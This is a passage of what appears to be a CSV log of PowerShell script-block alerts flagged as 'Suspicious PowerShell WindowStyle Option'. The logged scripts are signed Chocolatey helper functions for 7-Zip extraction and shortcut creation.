$process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden $process.StartInfo.CreateNoWindow = $true $process.Start() | Out-Null if ($process.StartInfo.RedirectStandardOutput) { $process.BeginOutputReadLine() } if ($process.StartInfo.RedirectStandardError) { $process.BeginErrorReadLine() } $process.WaitForExit() # For some reason this forces the jobs to finish and waits for # them to do so. Without this it never finishes. Unregister-Event -SourceIdentifier ""LogOutput_ChocolateyZipProc"" Unregister-Event -SourceIdentifier ""LogErrors_ChocolateyZipProc"" # sometimes the process hasn't fully exited yet. for ($loopCount=1; $loopCount -le 15; $loopCount++) { if ($process.HasExited) { break; } Write-Debug ""Waiting for 7z.exe process to exit - $loopCount/15 seconds""; Start-Sleep 1; } $exitCode = $process.ExitCode $process.Dispose() Set-PowerShellExitCode $exitCode Write-Debug ""Command ['$7zip' $params] exited with `'$exitCode`'."" if ($zipExtractLogFullPath) { Set-Content $zipExtractLogFullPath $global:zipFileList.ToString() -Encoding UTF8 -Force } Write-Debug ""7z exit code: $exitCode"" $errorMessageAddendum = "" This is most likely an issue with the '$env:chocolateyPackageName' package and not with Chocolatey itself. Please follow up with the package maintainer(s) directly."" switch ($exitCode) { 0 { break } 1 { throw 'Some files could not be extracted.' + $errorMessageAddendum } # this one is returned e.g. for access denied errors 2 { throw '7-Zip encountered a fatal error while extracting the files.' + $errorMessageAddendum } 7 { throw ('7-Zip command line error.' + $errorMessageAddendum) } 8 { throw '7-Zip out of memory.' + $errorMessageAddendum } 255 { throw 'Extraction cancelled by the user.' + $errorMessageAddendum } default { throw ""7-Zip signalled an unknown error (code $exitCode)"" + $errorMessageAddendum} } $env:ChocolateyPackageInstallLocation = $destination return $destination } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCDl7UF34Z4O7bJl # J2k4Fq6w3RZugnxsmdjzMLvixJbal6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lD","d2c72fb1-8ebf-d5d3-1e88-80f15ba1079a"
"2019-03-19 14:21:36.979 +01:00","Suspicious PowerShell WindowStyle Option","med","MSEDGEWIN10","PwSh",4104,74,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Install-ChocolateyShortcut { <# .SYNOPSIS Creates a shortcut .DESCRIPTION This adds a shortcut, at the specified location, with the option to specify a number of additional properties for the shortcut, such as Working Directory, Arguments, Icon Location, and Description. .NOTES If this errors, as it may if being run under the local SYSTEM account with particular folder that SYSTEM doesn't have, it will display a warning instead of failing a package installation. .INPUTS None .OUTPUTS None .PARAMETER ShortcutFilePath The full absolute path to where the shortcut should be created. .PARAMETER TargetPath The full absolute path to the target for new shortcut. .PARAMETER WorkingDirectory OPTIONAL - The full absolute path of the Working Directory that will be used by the new shortcut. As of v0.10.12, the directory will be created unless it contains environment variable expansion like `%AppData%\FooBar`. .PARAMETER Arguments OPTIONAL - Additonal arguments that should be passed along to the new shortcut. .PARAMETER IconLocation OPTIONAL- The full absolute path to an icon file to be used for the new shortcut. .PARAMETER Description OPTIONAL - A text description to be associated with the new description. .PARAMETER WindowStyle OPTIONAL - Type of windows target application should open with. Available in 0.9.10+. 0 = Hidden, 1 = Normal Size, 3 = Maximized, 7 - Minimized. Full list table 3.9 here: https://technet.microsoft.com/en-us/library/ee156605.aspx .PARAMETER RunAsAdmin OPTIONAL - Set ""Run As Administrator"" checkbox for the created the shortcut. Available in 0.9.10+. .PARAMETER PinToTaskbar OPTIONAL - Pin the new shortcut to the taskbar. Available in 0.9.10+. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # This will create a new shortcut at the location of ""C:\test.lnk"" and # link to the file located at ""C:\text.exe"" Install-ChocolateyShortcut -ShortcutFilePath ""C:\test.lnk"" -TargetPath ""C:\test.exe"" .EXAMPLE > # This will create a new shortcut at the location of ""C:\notepad.lnk"" # and link to the Notepad application. In addition, other properties # are being set to specify the working directory, an icon to be used for # the shortcut, along with a description and arguments. Install-ChocolateyShortcut ` -ShortcutFilePath ""C:\notepad.lnk"" ` -TargetPath ""C:\Windows\System32\notepad.exe"" ` -WorkingDirectory ""C:\"" ` -Arguments ""C:\test.txt"" ` -IconLocation ""C:\test.ico"" ` -Description ""This is the description"" .EXAMPLE > # Creates a new notepad shortcut on the root of c: that starts # notepad.exe as Administrator. Shortcut is also pinned to taskbar. # These parameters are available in 0.9.10+. Install-ChocolateyShortcut ` -ShortcutFilePath ""C:\notepad.lnk"" ` -TargetPath ""C:\Windows\System32\notepad.exe"" ` -WindowStyle 3 ` -RunAsAdmin ` -PinToTaskbar .LINK Install-ChocolateyDesktopLink .LINK Install-ChocolateyExplorerMenuItem .LINK Install-ChocolateyPinnedTaskBarItem #> param( [parameter(Mandatory=$true, Position=0)][string] $shortcutFilePath, [parameter(Mandatory=$true, Position=1)][string] $targetPath, [parameter(Mandatory=$false, Position=2)][string] $workingDirectory, [parameter(Mandatory=$false, Position=3)][string] $arguments, [parameter(Mandatory=$false, Position=4)][string] $iconLocation, [parameter(Mandatory=$false, Position=5)][string] $description, [parameter(Mandatory=$false, Position=6)][int] $windowStyle, [parameter(Mandatory=$false)][switch] $runAsAdmin, [parameter(Mandatory=$false)][switch] $pinToTaskbar, [parameter(ValueFromRemainingArguments = $true)][Object[]]$ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters # http://powershell.com/cs/blogs/tips/archive/2009/02/05/validating-a-url.aspx function isURIWeb($address) { $uri = $address -as [System.URI] $uri.AbsoluteURI -ne $null -and $uri.Scheme -match '[http|https]' } if (!$shortcutFilePath) { # shortcut file path could be null if someone is trying to get special # paths for LocalSystem (SYSTEM). Write-Warning ""Unable to create shortcut. `$shortcutFilePath can not be null."" return } $shortcutDirectory = $([System.IO.Path]::GetDirectoryName($shortcutFilePath)) if (!(Test-Path($shortcutDirectory))) { [System.IO.Directory]::CreateDirectory($shortcutDirectory) | Out-Null } if (!$targetPath) { throw ""Install-ChocolateyShortcut - `$targetPath can not be null."" } if(!(Test-Path($targetPath)) -and !(IsURIWeb($targetPath))) { Write-Warning ""'$targetPath' does not exist. If it is not created the shortcut will not be valid."" } if($iconLocation) { if(!(Test-Path($iconLocation))) { Write-Warning ""'$iconLocation' does not exist. A default icon will be used."" } } if ($workingDirectory) { if ($workingDirectory -notmatch '%\w+%' -and !(Test-Path($workingDirectory))) { [System.IO.Directory]::CreateDirectory($workingDirectory) | Out-Null } } Write-Debug ""Creating Shortcut..."" try { $global:WshShell = New-Object -com ""WScript.Shell"" $lnk = $global:WshShell.CreateShortcut($shortcutFilePath) $lnk.TargetPath = $targetPath $lnk.WorkingDirectory = $workingDirectory $lnk.Arguments = $arguments if($iconLocation) { $lnk.IconLocation = $iconLocation } if ($description) { $lnk.Description = $description } if ($windowStyle) { $lnk.WindowStyle = $windowStyle } $lnk.Save() Write-Debug ""Shortcut created."" [System.IO.FileInfo]$Path = $shortcutFilePath If ($runAsAdmin) { #In order to enable the ""Run as Admin"" checkbox, this code reads the .LNK as a stream # and flips a specific bit while writing a new copy. It then replaces the original # .LNK with the copy, similar to this example: http://poshcode.org/2513 $TempFileName = [IO.Path]::GetRandomFileName() $TempFile = [IO.FileInfo][IO.Path]::Combine($Path.Directory, $TempFileName) $Writer = New-Object System.IO.FileStream $TempFile, ([System.IO.FileMode]::Create) $Reader = $Path.OpenRead() While ($Reader.Position -lt $Reader.Length) { $Byte = $Reader.ReadByte() If ($Reader.Position -eq 22) {$Byte = 34} $Writer.WriteByte($Byte) } $Reader.Close() $Writer.Close() $Path.Delete() Rename-Item -Path $TempFile -NewName $Path.Name | Out-Null } If ($pinToTaskbar) { $scfilename = $Path.FullName $pinverb = (new-object -com ""shell.application"").namespace($(split-path -parent $Path.FullName)).Parsename($(split-path -leaf $Path.FullName)).verbs() | ?{$_.Name -eq 'Pin to Tas&kbar'} If ($pinverb) {$pinverb.doit()} } } catch { Write-Warning ""Unable to create shortcut. Error captured was $($_.Exception.Message)."" } } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCCV4kKnyvkP8Q6w # z2NjPs2m5xO4ValwoIiDMeri2Kx1gKCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgM4dhQyywPrPo8jpeR3DNbT7H2WdznBS1+Bus # KT2bfQ0wDQYJKoZIhvcNAQEBBQAEggEAbWUKxJRm84/EF8/zeqa1zKe4AWpJ/gEi # QwtcOXs0Qnyft51e8c1xU2GOQZgAGvgSh7/PxsyVsFf5RMUF4KTVDTiF1PBanepr # vyJHjlmCWoa+NIncrLkelzSZLVmR91IGBpxxuL3E03d1rLOBK3MsTsv/n1l0nTzj # Th0bWNHNjcnJ89/jqS6j0E/x06GXwECdXPke/u6rpZ+ne5huAOlJgmce9bBL1v39 # SLEstdUW37fHTfvf8W4O3vdUYwXayuZOv+5ACQA5wVnwEL/jv+qxNFlM1ciPSuDH # DnFvlJp1vUavbyg9F+n4RYni9EUQTAw9F7Izk3Mt3mS6HCFwSwVWtaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU5WjAjBgkqhkiG9w0BCQQxFgQUAIvU+JA/yY/VMDda # AF5AyoutdvkwDQYJKoZIhvcNAQEBBQAEggEAAw12+/6F/pa2s2bjPlFgk4ZjQcRt # p/abG6OoDWEMorncdvyhrOe39oQxthDUOLm/FW8JvvlFNHxBwjCy4KUxPRTsmmBf # JKzuGv9Au1dfjGJAS+lPZyxTC5nyeKbCnG3Zwy77dAxvN2ZVd/vRhyw/itKoE3Lv # MSvUKhrRTFB1Sm7if/dh9r5YiBFCgKoTJJ9PCxIrGOx6R3Gbci+StDJXHBDOqgDh # 